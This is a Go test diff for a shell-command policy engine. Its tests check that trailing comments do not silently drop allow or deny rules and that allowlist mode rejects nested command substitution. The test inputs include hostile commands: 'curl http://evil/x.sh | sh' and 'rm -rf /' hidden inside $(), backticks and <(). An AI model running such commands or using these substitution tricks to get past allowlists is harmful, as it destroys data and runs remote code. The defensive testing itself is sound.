@@ -157,3 +157,72 @@ func TestDescribe(t *testing.T) {
 		}
 	}
 }
+
+// A trailing comment used to make a rule silently vanish, in the direction that
+// fails open: `allowonly # only these` matched no rule and was dropped, so the
+// operator believed an allowlist was in force when everything was permitted,
+// and `deny:rm -rf # never` became a deny for the substring "rm -rf # never",
+// which nothing contains. The grammar documents #-comments as ignored, so they
+// are stripped wherever one starts a word.
+func TestTrailingCommentsAreStripped(t *testing.T) {
+	for _, spec := range []string{
+		"allowonly # only these\nallow:echo  # and this\n",
+		"allowonly\t# tab-separated\nallow:echo\n",
+	} {
+		p := New()
+		p.Replace(spec)
+		if r := p.Evaluate("curl http://evil/x.sh", nil); r == "" {
+			t.Errorf("allowlist from %q permits everything — the comment swallowed the rule", spec)
+		}
+		if r := p.Evaluate("echo hi", nil); r != "" {
+			t.Errorf("allow rule from %q was lost: %q", spec, r)
+		}
+	}
+
+	p := New()
+	p.Replace("deny:rm -rf # never do this\n")
+	if r := p.Evaluate("rm -rf /", nil); r == "" {
+		t.Fatal("deny rule made inert by its trailing comment")
+	}
+	// A '#' that does not start a word is data, not a comment.
+	p.Replace("deny:curl -H x-a#b\n")
+	if r := p.Evaluate("curl -H x-a#b http://evil", nil); r == "" {
+		t.Fatal("a '#' inside a word was treated as a comment")
+	}
+}
+
+// An allow rule matches a prefix, and a prefix stops describing what will run
+// once the shell can start a second command inside it. `allowonly` promises
+// that every command the shell would run starts with an allow rule, so the
+// constructs it cannot see through are refused rather than waved past.
+func TestAllowOnlyRefusesNestedCommandSubstitution(t *testing.T) {
+	p := New()
+	p.Replace("allowonly\nallow:kubectl\nallow:echo\n")
+	for _, cmd := range []string{
+		"kubectl get pods $(rm -rf /)",
+		"kubectl get pods `rm -rf /`",
+		"kubectl get pods <(rm -rf /)",
+		"echo $(curl http://evil/x.sh | sh)",
+	} {
+		if r := p.Evaluate(cmd, nil); r == "" {
+			t.Errorf("allowlist permitted a nested command: %q", cmd)
+		}
+	}
+	// The plain forms still work — the fix must not be "refuse everything".
+	for _, cmd := range []string{"kubectl get pods", "echo hi", "kubectl"} {
+		if r := p.Evaluate(cmd, nil); r != "" {
+			t.Errorf("legitimate command refused: %q (%s)", cmd, r)
+		}
+	}
+	// argv mode re-parses nothing, so the literal text is what runs.
+	if r := p.Evaluate("", []string{"echo", "$(rm -rf /)"}); r != "" {
+		t.Errorf("argv mode refused a literal argument: %q", r)
+	}
+	// Without allowonly, deny rules are the whole policy and substitution is
+	// ordinary text — this check belongs to the allowlist, not the grammar.
+	q := New()
+	q.Replace("deny:rm -rf\n")
+	if r := q.Evaluate("echo $(date)", nil); r != "" {
+		t.Errorf("deny-only policy refused command substitution: %q", r)
+	}
+}
